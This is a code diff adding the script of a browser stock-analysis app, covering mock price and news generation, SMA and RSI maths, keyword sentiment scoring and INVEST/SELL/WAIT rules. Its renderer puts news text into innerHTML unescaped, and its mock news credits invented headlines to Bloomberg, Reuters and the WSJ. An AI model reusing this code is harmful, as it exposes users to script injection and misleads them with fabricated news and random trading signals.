+            'AMZN': 185.30,
+            'GOOGL': 176.40,
+            'META': 502.10
+        };
+
+        const basePrice = basePrices[symbol] || 100.00 + (symbol.charCodeAt(0) * 2.5);
+        // Slightly randomize price variation
+        const randomFactor = (Math.random() * 0.08) - 0.04;
+        const currentPrice = Number((basePrice * (1 + randomFactor)).toFixed(2));
+        const previousClose = Number((currentPrice * (1 - (Math.random() * 0.03 - 0.015))).toFixed(2));
+        const changePercent = Number((((currentPrice - previousClose) / previousClose) * 100).toFixed(2));
+
+        const historicalCloses = generateMockCandles(currentPrice, 60);
+        const news = generateMockNews(symbol);
+
+        return {
+            ticker: symbol,
+            companyName: getCompanyName(symbol),
+            currentPrice: currentPrice,
+            previousClose: previousClose,
+            changePercent: changePercent,
+            historicalCloses: historicalCloses,
+            news: news,
+            isMock: true
+        };
+    }
+
+    function generateMockCandles(currentPrice, days) {
+        const closes = [currentPrice];
+        let price = currentPrice;
+
+        // Symbol deterministic trend simulation based on ticker character codes
+        const trendDirection = (currentPrice % 2 === 0) ? 0.002 : -0.001;
+
+        for (let i = 1; i < days; i++) {
+            const dailyChangePct = (Math.random() * 0.04 - 0.019) + trendDirection;
+            price = price / (1 + dailyChangePct);
+            closes.unshift(Number(price.toFixed(2)));
+        }
+        return closes;
+    }
+
+    function generateMockNews(symbol) {
+        const templates = [
+            {
+                headline: `${symbol} Reports Strong Quarterly Earnings and Revenue Beat`,
+                summary: `Analysts upgrade growth outlook following robust operational results, strong profit margins, and expanded guidance.`,
+                source: "Bloomberg",
+                datetime: "Today"
+            },
+            {
+                headline: `Institutional Investors Increase Holdings in ${symbol} Amid AI Expansion`,
+                summary: `Major hedge funds and institutional asset managers expanded position sizes during the latest quarterly disclosures.`,
+                source: "Reuters",
+                datetime: "Yesterday"
+            },
+            {
+                headline: `Market Analysts Evaluate Strategic Growth Opportunities for ${symbol}`,
+                summary: `Financial advisors maintain positive long-term momentum metrics despite macroeconomic rate volatility.`,
+                source: "Wall Street Journal",
+                datetime: "2 days ago"
+            }
+        ];
+        return templates;
+    }
+
+    // Mathematical Indicator Calculations
+
+    /**
+     * Calculates Simple Moving Average (SMA) over period (default 50 days)
+     */
+    function calculateSMA(closes, period = 50) {
+        if (!closes || closes.length === 0) return 0;
+        const slice = closes.slice(-period);
+        const sum = slice.reduce((acc, val) => acc + val, 0);
+        return Number((sum / slice.length).toFixed(2));
+    }
+
+    /**
+     * Calculates Relative Strength Index (RSI) over period (default 14 days)
+     */
+    function calculateRSI(closes, period = 14) {
+        if (!closes || closes.length <= period) {
+            return 50.0; // Default neutral RSI if not enough data
+        }
+
+        let gains = 0;
+        let losses = 0;
+
+        // Calculate initial avg gain and loss for first 14 periods
+        for (let i = 1; i <= period; i++) {
+            const change = closes[i] - closes[i - 1];
+            if (change >= 0) gains += change;
+            else losses += Math.abs(change);
+        }
+
+        let avgGain = gains / period;
+        let avgLoss = losses / period;
+
+        // Smooth with subsequent periods
+        for (let i = period + 1; i < closes.length; i++) {
+            const change = closes[i] - closes[i - 1];
+            const gain = change >= 0 ? change : 0;
+            const loss = change < 0 ? Math.abs(change) : 0;
+
+            avgGain = (avgGain * (period - 1) + gain) / period;
+            avgLoss = (avgLoss * (period - 1) + loss) / period;
+        }
+
+        if (avgLoss === 0) return 100.0;
+        const rs = avgGain / avgLoss;
+        const rsi = 100 - (100 / (1 + rs));
+        return Number(rsi.toFixed(2));
+    }
+
+    /**
+     * Analyzes news text for financial sentiment score (-1.0 to +1.0)
+     */
+    function calculateNewsSentiment(newsArray) {
+        if (!newsArray || newsArray.length === 0) {
+            return { score: 0.0, label: 'Neutral', positiveHits: 0, negativeHits: 0 };
+        }
+
+        const positiveKeywords = [
+            'beat', 'growth', 'upgrade', 'record', 'surge', 'gain', 'profit', 'bullish',
+            'expand', 'buy', 'strong', 'dividend', 'success', 'high', 'innovate', 'upside',
+            'rally', 'boost', 'outperform', 'exceed', 'revenue', 'positive', 'breakthrough'
+        ];
+
+        const negativeKeywords = [
+            'drop', 'fall', 'miss', 'loss', 'downgrade', 'risk', 'lawsuit', 'decline',
+            'crash', 'bearish', 'warn', 'cut', 'debt', 'slump', 'layoff', 'probe',
+            'recall', 'weak', 'slide', 'underperform', 'investigation', 'plunge', 'penalty'
+        ];
+
+        let totalPos = 0;
+        let totalNeg = 0;
+
+        newsArray.forEach(item => {
+            const fullText = `${item.headline || ''} ${item.summary || ''}`.toLowerCase();
+
+            positiveKeywords.forEach(kw => {
+                const regex = new RegExp(`\\b${kw}\\b`, 'gi');
+                const matches = fullText.match(regex);
+                if (matches) totalPos += matches.length;
+            });
+
+            negativeKeywords.forEach(kw => {
+                const regex = new RegExp(`\\b${kw}\\b`, 'gi');
+                const matches = fullText.match(regex);
+                if (matches) totalNeg += matches.length;
+            });
+        });
+
+        const totalWords = totalPos + totalNeg;
+        let score = 0.0;
+        if (totalWords > 0) {
+            score = (totalPos - totalNeg) / totalWords;
+        }
+
+        let label = 'Neutral';
+        if (score > 0.15) label = 'Positive';
+        else if (score < -0.15) label = 'Negative';
+
+        return {
+            score: Number(score.toFixed(2)),
+            label: label,
+            positiveHits: totalPos,
+            negativeHits: totalNeg
+        };
+    }
+
+    /**
+     * Decision Logic Engine
+     * Evaluates technical indicators & news sentiment according to specified rules:
+     *
+     * INVEST (Buy Signal):
+     *  - RSI < 30 (Oversold condition)
+     *  - OR (Current Price > 50-day Moving Average AND News Sentiment is Positive)
+     *
+     * SELL (Sell Signal):
+     *  - RSI > 70 (Overbought condition)
+     *  - OR (Current Price drops significantly below 50-day Moving Average AND News Sentiment is Negative)
+     *
+     * WAIT (Hold Signal):
+     *  - Data is mixed, neutral, or does not hit thresholds.
+     */
+    function evaluateDecision(currentPrice, sma50, rsi14, sentiment) {
+        const isOversold = rsi14 < 30;
+        const isOverbought = rsi14 > 70;
+        const isAboveSMA = currentPrice > sma50;
+        // Significant drop below 50SMA defined as >= 1.5% below 50SMA or simple price < sma50
+        const isSignificantlyBelowSMA = currentPrice < (sma50 * 0.985);
+        const isPosSentiment = sentiment.label === 'Positive' || sentiment.score > 0.1;
+        const isNegSentiment = sentiment.label === 'Negative' || sentiment.score < -0.1;
+
+        const reasons = [];
+
+        // Check BUY / INVEST Conditions
+        const buyRsiCondition = isOversold;
+        const buyTrendCondition = isAboveSMA && isPosSentiment;
+
+        // Check SELL Conditions
+        const sellRsiCondition = isOverbought;
+        const sellTrendCondition = (currentPrice < sma50) && isNegSentiment;
+
+        let recommendation = 'WAIT';
+
+        if (buyRsiCondition || buyTrendCondition) {
+            recommendation = 'INVEST';
+            if (buyRsiCondition) {
+                reasons.push(`RSI is ${rsi14} (< 30), indicating stock is in oversold territory (buying opportunity).`);
+            }
+            if (buyTrendCondition) {
+                reasons.push(`Current price ($${currentPrice.toFixed(2)}) is trading above the 50-Day Moving Average ($${sma50.toFixed(2)}).`);
+                reasons.push(`Recent market news sentiment is positive (Score: ${sentiment.score > 0 ? '+' : ''}${sentiment.score}).`);
+            }
+        } else if (sellRsiCondition || sellTrendCondition) {
+            recommendation = 'SELL';
+            if (sellRsiCondition) {
+                reasons.push(`RSI is ${rsi14} (> 70), indicating stock is in overbought territory (profit taking signal).`);
+            }
+            if (sellTrendCondition) {
+                reasons.push(`Current price ($${currentPrice.toFixed(2)}) has dropped below the 50-Day Moving Average ($${sma50.toFixed(2)}).`);
+                reasons.push(`Recent market news sentiment is negative (Score: ${sentiment.score}).`);
+            }
+        } else {
+            recommendation = 'WAIT';
+            reasons.push(`RSI (${rsi14}) is in the neutral 30 - 70 range.`);
+            if (isAboveSMA) {
+                reasons.push(`Price ($${currentPrice.toFixed(2)}) is above 50-Day SMA ($${sma50.toFixed(2)}), but news sentiment is neutral/mixed (${sentiment.score}).`);
+            } else {
+                reasons.push(`Price ($${currentPrice.toFixed(2)}) is below 50-Day SMA ($${sma50.toFixed(2)}), but does not meet strong sell criteria.`);
+            }
+            reasons.push(`Market signals are mixed or neutral. Recommended to hold position and wait for clearer breakout or entry signal.`);
+        }
+
+        return {
+            decision: recommendation,
+            reasons: reasons,
+            isOversold: isOversold,
+            isOverbought: isOverbought,
+            isAboveSMA: isAboveSMA
+        };
+    }
+
+    // UI Event Handlers & Rendering
+
+    async function handleAnalyze(e) {
+        if (e) e.preventDefault();
+
+        const tickerInput = document.getElementById('tickerInput');
+        const apiKeyInput = document.getElementById('apiKeyInput');
+        const analyzeBtn = document.getElementById('analyzeBtn');
+        const btnText = document.getElementById('btnText');
+        const btnSpinner = document.getElementById('btnSpinner');
+        const errorBanner = document.getElementById('errorBanner');
+        const resultsSection = document.getElementById('resultsSection');
+
+        const ticker = tickerInput.value.trim().toUpperCase();
+        if (!ticker) return;
+
+        // UI Loading state
+        analyzeBtn.disabled = true;
+        btnText.textContent = 'Analyzing...';
+        btnSpinner.classList.remove('hidden');
+        errorBanner.classList.add('hidden');
+
+        try {
+            const data = await fetchStockData(ticker, apiKeyInput.value);
+
+            // Calculate indicators
+            const sma50 = calculateSMA(data.historicalCloses, 50);
+            const rsi14 = calculateRSI(data.historicalCloses, 14);
+            const sentiment = calculateNewsSentiment(data.news);
+
+            // Decision
+            const analysis = evaluateDecision(data.currentPrice, sma50, rsi14, sentiment);
+
+            // Render Results
+            renderResults(data, sma50, rsi14, sentiment, analysis);
+
+            resultsSection.classList.remove('hidden');
+
+        } catch (err) {
+            console.error("Error analyzing stock:", err);
+            document.getElementById('errorMessage').textContent = err.message || "Failed to analyze stock ticker. Please try again.";
+            errorBanner.classList.remove('hidden');
+        } finally {
+            analyzeBtn.disabled = false;
+            btnText.textContent = 'Analyze Stock';
+            btnSpinner.classList.add('hidden');
+        }
+    }
+
+    function renderResults(data, sma50, rsi14, sentiment, analysis) {
+        // Ticker & Company Header
+        document.getElementById('resTicker').textContent = data.ticker;
+        document.getElementById('resCompanyName').textContent = data.companyName;
+        document.getElementById('resPriceHeader').textContent = `$${data.currentPrice.toFixed(2)}`;
+
+        // Decision Badge & Card styling
+        const decisionCard = document.getElementById('decisionCard');
+        const decisionBadge = document.getElementById('decisionBadge');
+
+        decisionCard.className = `decision-card ${analysis.decision.toLowerCase()}`;
+        decisionBadge.className = `badge-decision ${analysis.decision.toLowerCase()}`;
+        decisionBadge.textContent = analysis.decision;
+
+        // Rationale list
+        const reasonsList = document.getElementById('reasonsList');
+        reasonsList.innerHTML = '';
+        analysis.reasons.forEach(reason => {
+            const li = document.createElement('li');
+
+            let bulletColor = '#f59e0b';
+            if (analysis.decision === 'INVEST') bulletColor = '#10b981';
+            else if (analysis.decision === 'SELL') bulletColor = '#ef4444';
+
+            li.innerHTML = `<span class="bullet" style="background:${bulletColor};"></span> <span>${reason}</span>`;
+            reasonsList.appendChild(li);
+        });
+
+        // Current Price Card
+        document.getElementById('resPrice').textContent = `$${data.currentPrice.toFixed(2)}`;
+        const priceTag = document.getElementById('resPriceTag');
+        const changeVal = data.changePercent || 0;
+        priceTag.textContent = `${changeVal >= 0 ? '+' : ''}${changeVal.toFixed(2)}%`;
+        priceTag.className = `metric-tag ${changeVal >= 0 ? 'positive' : 'negative'}`;
+
+        // SMA Card
+        document.getElementById('resSMA50').textContent = `$${sma50.toFixed(2)}`;
+        const smaTag = document.getElementById('resSMATag');
+        const smaPercentEl = document.getElementById('resSMAPercent');
+        const diffFromSMA = (((data.currentPrice - sma50) / sma50) * 100).toFixed(2);
+
+        if (data.currentPrice >= sma50) {
+            smaTag.textContent = 'Bullish (> SMA)';
+            smaTag.className = 'metric-tag positive';
+            smaPercentEl.textContent = `Price +${diffFromSMA}% vs 50SMA`;
+        } else {
+            smaTag.textContent = 'Bearish (< SMA)';
+            smaTag.className = 'metric-tag negative';
+            smaPercentEl.textContent = `Price ${diffFromSMA}% vs 50SMA`;
+        }
+
+        // RSI Card
+        document.getElementById('resRSI').textContent = rsi14.toFixed(1);
+        const rsiTag = document.getElementById('resRSITag');
+        const rsiBarFill = document.getElementById('rsiBarFill');
+
+        rsiBarFill.style.width = `${Math.min(Math.max(rsi14, 0), 100)}%`;
+
+        if (rsi14 < 30) {
+            rsiTag.textContent = 'Oversold (< 30)';
+            rsiTag.className = 'metric-tag positive';
+        } else if (rsi14 > 70) {
+            rsiTag.textContent = 'Overbought (> 70)';
+            rsiTag.className = 'metric-tag negative';
+        } else {
+            rsiTag.textContent = 'Neutral (30-70)';
+            rsiTag.className = 'metric-tag neutral';
+        }
+
+        // Sentiment Card
+        document.getElementById('resSentimentScore').textContent = `${sentiment.score > 0 ? '+' : ''}${sentiment.score}`;
+        const sentimentTag = document.getElementById('resSentimentTag');
+        sentimentTag.textContent = `${sentiment.label} (${sentiment.score > 0 ? '+' : ''}${sentiment.score})`;
+
+        if (sentiment.label === 'Positive') sentimentTag.className = 'metric-tag positive';
+        else if (sentiment.label === 'Negative') sentimentTag.className = 'metric-tag negative';
+        else sentimentTag.className = 'metric-tag neutral';
+
+        // News Headlines (Top 3)
+        const newsGrid = document.getElementById('newsGrid');
+        newsGrid.innerHTML = '';
+
+        const top3News = data.news.slice(0, 3);
+        if (top3News.length === 0) {
+            newsGrid.innerHTML = '<p style="color: var(--text-muted); font-size:0.9rem;">No recent news found for this ticker.</p>';
+        } else {
+            top3News.forEach(item => {
+                const newsCard = document.createElement('div');
+                newsCard.className = 'news-item';
+                newsCard.innerHTML = `
+                    <div class="news-meta">
+                        <span>${item.source}</span>
+                        <span>${item.datetime}</span>
+                    </div>
+                    <a href="${item.url}" target="_blank" class="news-title">${item.headline}</a>
+                    <p class="news-summary">${item.summary}</p>
+                `;
+                newsGrid.appendChild(newsCard);
+            });
+        }
+    }
+
+    // Auto load default ticker AAPL on page launch
+    window.addEventListener('DOMContentLoaded', () => {
+        handleAnalyze();
+    });
 </script>
 </body>
 </html>
